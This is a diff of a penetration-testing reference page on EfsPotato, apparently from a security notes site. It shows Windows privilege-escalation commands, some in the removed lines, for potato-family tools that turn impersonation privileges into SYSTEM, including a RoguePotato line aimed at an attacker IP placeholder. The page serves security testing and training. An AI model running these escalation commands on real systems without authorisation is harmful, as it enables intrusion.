@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/efspotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=efspotato) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Check a compatible EFS impersonation path
+## Check a compatible EFS impersonation path
 
 **Run in:** Windows PowerShell. **Requires:** The intended EfsPotato implementation, required impersonation privilege and reachable local EFSRPC/service behavior.
 
@@ -21,56 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 .\EfsPotato.exe "cmd /c whoami"
 ```
 
-**Read the result:** Validate the EFS/RPC and token conditions for the installed implementation and target build.
-
-**If The pipe/RPC operation fails or no elevated identity appears:** Different variants use different entry points and assumptions; retain the exact binary/version and resulting identity with the example.
+**What the result establishes:** Validate the EFS/RPC and token conditions for the installed implementation and target build.
 
 **Next check:** Read the actual RPC and token errors and compare host/build support; a running executable is not a completed escalation.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/zcgonvh/EfsPotato)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## EfsPotato.exe: choose the operation and read the result
-
-Commands and examples collected from your EfsPotato.exe notes.
-
-### What the result establishes
-
-Validate the EFS/RPC and token conditions for the installed implementation and target build.
-
-### Prerequisites and common failures
-
-Different variants use different entry points and assumptions; retain the exact binary/version and resulting identity with the example.
-
-### Example 1: A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```cmd
-:: PrintSpoofer (uses the print spooler / RPC)
-.\PrintSpoofer64.exe -i -c cmd.exe
-:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
-.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
-:: alternatives if those are blocked:
-.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
-.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
-.\EfsPotato.exe "cmd /c whoami"
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your EfsPotato.exe notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=efspotato) · [All tools](/index)
 
 ## A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
 
@@ -96,7 +55,15 @@ Commands and examples collected from your EfsPotato.exe notes.
 
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The pipe/RPC operation fails or no elevated identity appears | Different variants use different entry points and assumptions; retain the exact binary/version and resulting identity with the example. |
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/zcgonvh/EfsPotato)
 
 {/* VAULT_RELATED_START */}
 
@@ -105,5 +72,3 @@ Saved as written; may include lab values or terminal output.
 - [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
